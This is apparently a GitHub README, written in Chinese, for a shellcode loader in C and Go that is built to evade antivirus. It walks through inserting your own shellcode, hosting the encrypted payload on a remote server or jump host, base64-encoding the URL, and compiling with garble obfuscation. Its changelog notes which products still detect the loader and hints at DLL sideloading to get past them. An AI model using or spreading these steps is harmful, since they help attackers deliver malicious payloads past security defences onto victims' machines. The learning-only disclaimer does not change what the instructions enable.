# C_Sep_Loader

## Introduce

一个简单的远程分离的加载器,免杀国内大部分杀软

## How to use

### C版本

修改Encryption/payload_c_x64.py的24行，改为自己的shellcode

运行python脚本（环境python3.6）

将生成的result.txt上传到Web端（Oss,跳板等机器）

copy自己的地址如http://example.org 并进行[base64编码](https://www.base64decode.org/)

将http://example.org_base64 替换 ShellCodeLoader/Source.c 的170行，生成64位发行版即可

### Go版本

修改Encryption/payload_c_x64.py的24行，改为自己的shellcode

运行python脚本（环境python3.6）

将生成的result.txt上传到Web端（Oss,跳板等机器）

copy自己的地址如http://example.org 并进行[base64编码](https://www.base64decode.org/)

Go1.20以上,[Garble](https://github.com/burrowers/garble)，进入Go_Sep_Loader目录下使用garble进行编译

    garble -seed=random build main.go

生成出main.exe,使用方法为带参运行e.g.

    main.exe 5L2g5ZKL5Zue5LqL5bCP5LyZ5a2Q5oOz5bmy5Zib(base64编码过的地址)

## Log
2024.6.20 小更一下，~~摸会鱼~~，增加了一层url_base64编码，后续有时间再更。

2024.6.29 使用go重构项目，采用分离加载，原理同C版本。
![image](https://github.com/1K0ng/C_Sep_Loader/assets/156843472/b08c2b23-1199-48a1-a3a8-f217b6cffa0b)
![image](https://github.com/1K0ng/C_Sep_Loader/assets/156843472/88721c70-28fc-4c32-a9b5-589ae29535cb)
![image](https://github.com/1K0ng/C_Sep_Loader/assets/156843472/5c0cb532-c451-4184-a563-8b01fd160ea8)

诺顿动态还是不得行，建议白加黑（埋个小坑）

![image](https://github.com/1K0ng/C_Sep_Loader/assets/156843472/21b3e4e9-e88e-4ff6-b730-6d56055306be)
![image](https://github.com/1K0ng/C_Sep_Loader/assets/156843472/855f1010-bf32-478a-bb7c-1eab413faf4c)

勉强能用

## Ps
此项目为开源项目，仅提供与学习。项目样本会在公开前由本人扔沙箱，请勿用于违法行为，造成的违法行为与本人无关；如转载请标明出处，请勿商用，请勿商用，请勿商用！！！

菜鸡本人的垃圾项目，未添加反调试反沙箱等代码，因而不保证其免杀时效。

issus暂不解答免杀的问题，技术讨论可以提issus，求抱大佬大腿.jpg.

## Contact
Email:1K0ng@proton.me 请标明来意。

## Reference

Obfuscate Go builds https://github.com/burrowers/garble

## Star History

![Star History Chart](https://api.star-history.com/svg?repos=1K0ng/C_Sep_Loader&type=Date)






